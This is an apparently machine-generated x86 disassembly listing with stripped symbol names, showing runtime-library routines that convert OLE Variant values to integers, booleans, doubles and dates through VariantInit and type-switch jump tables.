mov eax ebx
call sub_410c50
and eax 0x7f
xor edx edx
mov [ esp ] eax
mov [ esp + 0x4 ] edx
jmp r-xdata
sub_41049c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
xor edx edx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41058a
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0xc ]
call sub_412c18
lea eax [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
call sub_4042c0
mov eax [ ebp - 0x1c ]
lea edx [ ebp - 0x8 ]
call sub_40842c
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410591
lea eax [ ebp - 0x1c ]
call sub_404038
lea eax [ ebp - 0xc ]
call sub_404744
retn
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
lea eax [ ebp - 0x18 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
cdq
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
jmp r-xdata
cmp eax 0x80020005
jne r-xdata
fld [ ebp - 0x18 ]
call sub_402a78
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
jmp r-xdata
mov dx [ ebx ]
mov cx 0x14
call sub_40ee34
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x0
mov eax ebx
call sub_410c50
and eax 0x7f
xor edx edx
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
jmp r-xdata
sub_41059c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_4105f3
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x18 ]
call sub_40f500
lea eax [ ebp - 0x18 ]
call [ rw-data ]
lea eax [ ebp - 0x18 ]
call sub_410654
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4105fa
lea eax [ ebp - 0x18 ]
call sub_40f1d8
retn
sub_410608
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_4146ec
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x14
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
mov eax [ esp + 0x10 ]
mov [ edi + 0x4 ] eax
sub_410654
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_410a60
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx [ ebp - 0x4 ]
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_410687 ]
mov eax [ ebp - 0x4 ]
call sub_41049c
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
dec dx
je r-xdata
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0xc ] 0x0
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_402a78
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_402a78
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fdiv [ r-xdata ]
call sub_402a78
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_402a78
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41049c
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x8 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0xc ]
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_410654
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4103f0
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41059c
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0xc ] 0x0
jmp r-xdata
mov dx 0x14
mov ax 0x1
call sub_40e9a0
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x4 ]
test ah 0x40
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_410608
test al al
jne r-xdata
mov edx [ ebp - 0x4 ]
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax [ ebp - 0x4 ]
call sub_4103f0
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x4 ]
call sub_4103f0
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
jmp [ eax * 4 + jump_table_4108ab ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_402a78
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_402a78
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fild [ eax ]
fdiv [ r-xdata ]
call sub_402a78
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_402a78
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41049c
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movzx eax [ eax ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movzx eax [ eax ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0x4 ]
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_410654
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
sub_410a98
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_410b4f
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x8 ]
call sub_412c18
lea eax [ ebp - 0xa ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_4042c0
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0x1 ]
call sub_408518
test al al
jne r-xdata
sub edx 0x7ffdfffb
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410b56
lea eax [ ebp - 0x10 ]
call sub_404038
lea eax [ ebp - 0x8 ]
call sub_404744
retn
mov dx [ ebx ]
mov cx 0xb
mov eax 0x80020005
call sub_40ee34
jmp r-xdata
mov dx [ ebx ]
mov cx 0xb
call sub_40ee34
cmp [ ebp - 0xa ] 0x1
sbb eax eax
inc eax
mov [ ebp - 0x1 ] al
jmp r-xdata
sub_410b60
push ebx
add esp 0xfffffff0
mov ebx eax
push esp
call VariantInit
push 0xb
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0xb
call sub_40ee34
cmp [ esp + 0x8 ] 0x1
sbb eax eax
inc eax
add esp 0x10
pop ebx
retn
sub_410ba0
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx eax
lea eax [ ebp - 0x11 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_410bf4
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x11 ]
call sub_40f500
lea eax [ ebp - 0x11 ]
call [ rw-data ]
lea eax [ ebp - 0x11 ]
call sub_410c50
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410bfb
lea eax [ ebp - 0x11 ]
call sub_40f1d8
retn
sub_410c04
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_4146ec
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0xb
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
cmp [ esp + 0xc ] 0x1
sbb eax eax
inc eax
mov [ edi ] al
sub_410c50
push ebx
push ecx
mov ebx eax
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_410c6a ]
mov eax ebx
call sub_410a98
mov [ esp ] al
jmp r-xdata
dec dx
je r-xdata
mov [ esp ] 0x0
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
fld [ ebx + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
fld [ ebx + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
fild [ ebx + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
fld [ ebx + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax ebx
call sub_410a98
mov [ esp ] al
jmp r-xdata
cmp [ ebx + 0x8 ] 0x1
sbb eax eax
inc eax
mov [ esp ] al
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
call sub_410c50
mov [ esp ] al
jmp r-xdata
mov eax ebx
call sub_410b60
mov [ esp ] al
jmp r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov eax ebx
call sub_410ba0
mov [ esp ] al
jmp r-xdata
jmp r-xdata
mov [ esp ] 0x0
jmp r-xdata
mov dx 0xb
mov ax 0x1
call sub_40e9a0
setne al
mov [ esp ] al
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
test ah 0x40
je r-xdata
mov edx esp
mov eax ebx
call sub_410c04
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax ebx
call sub_410b60
mov [ esp ] al
mov eax ebx
call sub_410b60
mov [ esp ] al
jmp r-xdata
jmp [ eax * 4 + jump_table_410e2c ]
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax ebx
call sub_410a98
mov [ esp ] al
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x1
sbb eax eax
inc eax
mov [ esp ] al
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
call sub_410c50
mov [ esp ] al
jmp r-xdata
setne al
mov [ esp ] al
jmp r-xdata
cmp [ eax ] 0x0
sub_410fa4
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
xor edx edx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_411059
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0xc ]
call sub_412c18
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
call sub_4042c0
mov eax [ ebp - 0x1c ]
lea edx [ ebp - 0x18 ]
call sub_4098a8
test al al
je r-xdata
sub edx 0x7ffdfffb
jne r-xdata
mov dx [ ebx ]
mov cx 0x5
mov eax 0x80020005
call sub_40ee34
jmp r-xdata
fld [ ebp - 0x18 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov dx [ ebx ]
mov cx 0x5
call sub_40ee34
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411060
lea eax [ ebp - 0x1c ]
call sub_404038
lea eax [ ebp - 0xc ]
call sub_404744
retn
sub_411068
push ebx
add esp 0xffffffe8
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
call VariantInit
push 0x5
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x5
call sub_40ee34
mov eax [ esp + 0x10 ]
mov [ esp ] eax
mov eax [ esp + 0x14 ]
mov [ esp + 0x4 ] eax
fld [ esp ]
add esp 0x18
pop ebx
retn
sub_4110b4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_411109
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x18 ]
call sub_40f500
lea eax [ ebp - 0x18 ]
call [ rw-data ]
lea eax [ ebp - 0x18 ]
call sub_411164
fstp [ ebp - 0x8 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411110
lea eax [ ebp - 0x18 ]
call sub_40f1d8
retn
sub_411118
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_4146ec
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x5
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
mov eax [ esp + 0x10 ]
mov [ edi + 0x4 ] eax
sub_411164
push ebx
add esp 0xffffffec
mov ebx eax
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_411180 ]
mov eax ebx
call sub_410fa4
fstp [ esp ]
fwait
jmp r-xdata
dec dx
je r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
fld [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp ] eax
mov eax [ ebx + 0xc ]
mov [ esp + 0x4 ] eax
jmp r-xdata
fild [ ebx + 0x8 ]
fdiv [ r-xdata ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp ] eax
mov eax [ ebx + 0xc ]
mov [ esp + 0x4 ] eax
jmp r-xdata
mov eax ebx
call sub_410fa4
fstp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
xor eax eax
mov al [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
movzx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_411164
fstp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_411068
fstp [ esp ]
fwait
jmp r-xdata
fld [ esp ]
add esp 0x14
pop ebx
retn
mov eax ebx
call sub_4110b4
fstp [ esp ]
fwait
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
mov dx 0x5
mov ax 0x1
call sub_40e9a0
test ah 0x40
je r-xdata
mov edx esp
mov eax ebx
call sub_411118
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax ebx
call sub_411068
fstp [ esp ]
fwait
mov eax ebx
call sub_411068
fstp [ esp ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_41135d ]
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ eax ]
mov [ esp ] edx
mov edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fdiv [ r-xdata ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ eax ]
mov [ esp ] edx
mov edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax ebx
call sub_410fa4
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_411164
fstp [ esp ]
fwait
jmp r-xdata
sub_4114fc
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
cmp eax 0x14
ja r-xdata
xor eax eax
push ebp
push sub_411661
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_411164
fstp [ ebp - 0x8 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
jmp [ eax * 4 + jump_table_41151e ]
fld [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
fild [ ebp - 0xc ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
fild [ ebp - 0xc ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
fild [ ebp - 0xc ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
fild [ ebp - 0xc ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x14 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
fild [ ebp - 0x14 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov dx 0x4
mov ax 0x1
call sub_40e9a0
sub_41168c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor edx edx
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_411768
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0xc ]
call sub_412c18
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
call sub_4042c0
mov eax [ ebp - 0x1c ]
lea edx [ ebp - 0x8 ]
call sub_40b0d4
test al al
jne r-xdata
sub edx 0x7ffdfffb
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41176f
lea eax [ ebp - 0x20 ]
mov edx 0x2
call sub_40405c
lea eax [ ebp - 0xc ]
call sub_404744
retn
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
call sub_4042c0
mov eax [ ebp - 0x20 ]
lea edx [ ebp - 0x18 ]
call sub_4098c4
test al al
je r-xdata
mov dx [ ebx ]
mov cx 0x7
call sub_40ee34
jmp r-xdata
mov dx [ ebx ]
mov cx 0x7
mov eax 0x80020005
call sub_40ee34
jmp r-xdata
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
sub_411778
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
mov [ ebp - 0x18 ] 0x5
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
push 0x7
push 0x0
push 0x400
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x7
call sub_40ee34
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4117d8
push ebx
add esp 0xffffffe8
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
call VariantInit
push 0x7
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x7
call sub_40ee34
mov eax [ esp + 0x10 ]
mov [ esp ] eax
mov eax [ esp + 0x14 ]
